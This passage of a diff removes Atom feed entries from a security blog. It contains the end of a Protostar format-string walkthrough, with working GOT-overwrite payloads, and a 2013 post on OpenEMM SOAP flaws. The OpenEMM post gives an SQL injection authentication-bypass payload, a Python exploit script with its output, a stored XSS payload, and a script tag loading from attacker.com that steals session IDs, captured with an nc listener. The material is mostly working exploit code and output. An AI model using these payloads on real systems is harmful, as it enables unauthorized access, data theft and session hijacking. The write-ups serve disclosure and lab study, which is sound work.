-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%17u%13$n%173u%14$n%15$x"' | ./format3
-</span><span class='line'>��������                                                   0       3221222896                                                                                                                                                                   308684389280496f7
-</span><span class='line'>you have modified the target :)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As noted earlier, we don&rsquo;t actually have to write anything to the final byte, as it is set due to a previous overflow.</p>
-
-<h2>Format String Level 04</h2>
-
-<p>The final level in the format string section, this one requires us to redirect execution to another method, <code>hello</code>.  This probably means we&rsquo;ll need to overwrite a value in the GOT, or the Global Offset Table, which acts as a trampoline for dynamic libraries.  Let&rsquo;s start by finding the hello function that we want to redirect execution flow to:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -M intel -t format4 | grep hello
-</span><span class='line'>080484b4 g     F .text  0000001e              hello</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And running our script:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python /home/user/test.py 
-</span><span class='line'>[!] Searching for offset..
-</span><span class='line'>[!] Format found at offset 4
-</span><span class='line'>[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format4</span></code></pre></td></tr></table></div></figure>
-
-
-<p>If we take a look at the <a href="http://webcache.googleusercontent.com/search?q=cache:KFYMJlYdHdMJ:exploit-exercises.com/protostar/format4+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=us">code</a>, we see a call to exit right after the vulnerable printf.  This is the entry we want to overwrite.  We now need that address:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump --dynamic-reloc format4 | grep exit
-</span><span class='line'>08049718 R_386_JUMP_SLOT   _exit
-</span><span class='line'>08049724 R_386_JUMP_SLOT   exit</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So we need to overwrite 0x08049724 with 0x080484b4.  Let&rsquo;s give this a shot:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "%4$n%5$n%6$n%7$n"' &gt; /tmp/input
-</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./format4
-</span><span class='line'>Reading symbols from /opt/protostar/bin/format4...done.
-</span><span class='line'>(gdb) r &lt; /tmp/input
-</span><span class='line'>Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
-</span><span class='line'>$�%�&�'�
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x10101010 in ?? ()
-</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>
-
-
-<p>We&rsquo;ve verified we&rsquo;re at the right location and can control EIP; notice, however, that the two addresses only differ by 2 bytes.  If we use the <code>$hn</code>, or a short 2 byte write, we can get by with less code:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08" + "%4$hn"' &gt; /tmp/input
-</span><span class='line'>user@protostar:/opt/protostar/bin$ gdb -q ./format4
-</span><span class='line'>Reading symbols from /opt/protostar/bin/format4...done.
-</span><span class='line'>(gdb) r &lt; /tmp/input
-</span><span class='line'>Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
-</span><span class='line'>$�
-</span><span class='line'>
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x08040004 in ?? ()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>More simple math, <code>p/d 0x84b4 - 0x0004</code>, gives us 33968.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "\x24\x97\x04\x08" + "%33968u%4$hn"' | ./format4
-</span><span class='line'>[snip whitespace]
-</span><span class='line'>code execution redirected! you win</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And that&rsquo;s it!  Next up, heap exploitation.</p>
 ]]></content>
   </entry>
   
@@ -6409,241 +6762,6 @@ Their analytics status/server monitoring application is vulnerable to a fairly t
 
 
 <p><a href="http://www.exploit-db.com/exploits/28971/">Exploit</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[OpenEMM-2013 SOAP SQLi/Stored XSS]]></title>
-    <link href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/"/>
-    <updated>2013-07-28T22:24:15-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss</id>
-    <content type="html"><![CDATA[<p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>
-
-<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>  /**
-</span><span class='line'>     * Gets the SQL string.
-</span><span class='line'>     */
-</span><span class='line'>    public static String getSQLSafeString(String input) {
-</span><span class='line'>        if (input == null) {
-</span><span class='line'>            return " ";
-</span><span class='line'>        } else {
-</span><span class='line'>            return input.replace("'", "''");
-</span><span class='line'>        }
-</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>\' AND UNION SELECT 1,2,3;-- </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
-<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>
-
-<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {
-</span><span class='line'>        boolean result=false;
-</span><span class='line'>        Connection dbConn=this.getConnection(msct);
-</span><span class='line'>        Statement agnStatement=null;
-</span><span class='line'>        ResultSet rset=null;
-</span><span class='line'>        
-</span><span class='line'>        try {
-</span><span class='line'>            agnStatement=dbConn.createStatement();
-</span><span class='line'>            rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
-</span><span class='line'>            if(rset!=null && rset.next()) {
-</span><span class='line'>                result=true;
-</span><span class='line'>            } else {
-</span><span class='line'>                result=false;
-</span><span class='line'>                HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
-</span><span class='line'>                log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
-</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>
-
-<p>The following code will bypass SOAP authentication and add a new mailing list:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>from SOAPpy import WSDL
-</span><span class='line'>
-</span><span class='line'>wsdl_file = "./ws.wsdl"
-</span><span class='line'>sploit = "\\' OR 1=1;-- "
-</span><span class='line'>
-</span><span class='line'>_server = WSDL.Proxy(wsdl_file)
-</span><span class='line'>ret = _server.addMailinglist("wsadmin", sploit, "w00t", "w00t")
-</span><span class='line'>if ret &gt; 0:
-</span><span class='line'>    print 'success (%d)'%ret</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -h
-</span><span class='line'>usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [--dm] [--ds]
-</span><span class='line'>
-</span><span class='line'>optional arguments:
-</span><span class='line'>  -h, --help  show this help message and exit
-</span><span class='line'>  -i HOST     server address
-</span><span class='line'>  -s          fetch all subscribers
-</span><span class='line'>  -m MLIST    create new mailing list (XSS)
-</span><span class='line'>  --dm        delete all mailing lists
-</span><span class='line'>  --ds        delete all subscribers
-</span><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
-</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30449464&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Last', 'First', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'first.last@domain.org', '2', '6', '29', '54', '0', '17', '1']}
-</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30446728&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Name', 'No', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'no.name@yourdomain.com', '2', '6', '29', '54', '0', '17', '2']}
-</span><span class='line'>[!] Discovered 2 subscribers
-</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>
-
-<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select user();
-</span><span class='line'>+-------------------+
-</span><span class='line'>| user()            |
-</span><span class='line'>+-------------------+
-</span><span class='line'>| agnitas@localhost |
-</span><span class='line'>+-------------------+
-</span><span class='line'>1 row in set (0.00 sec)
-</span><span class='line'>
-</span><span class='line'>mysql&gt; show grants;
-</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
-</span><span class='line'>| Grants for agnitas@localhost                                                                                                                       |
-</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
-</span><span class='line'>| GRANT USAGE ON *.* TO 'agnitas'@'localhost' IDENTIFIED BY PASSWORD '*BC428C4FAA04992D1E8CF04545DD70FA60E588C5'                                     |
-</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm`.* TO 'agnitas'@'localhost'     |
-</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm_cms`.* TO 'agnitas'@'localhost' |
-</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
-</span><span class='line'>3 rows in set (0.00 sec)
-</span><span class='line'>
-</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>
-
-
-<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>
-
-<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
-</span><span class='line'>[!] Description field vulnerable to stored xss!
-</span><span class='line'>[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
-</span><span class='line'>[!] Saved successfully
-</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
-
-
-<p><img class="center" src="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg"></p>
-
-<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# nc -l -p 80
-</span><span class='line'>GET / HTTP/1.1
-</span><span class='line'>Host: 192.168.1.147
-</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
-</span><span class='line'>Accept: */*
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Referer: http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1
-</span><span class='line'>Connection: keep-alive
-</span><span class='line'>
-</span><span class='line'>^C
-</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
-
-
-<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>
-
-<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
-<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
 ]]></content>
   </entry>
   
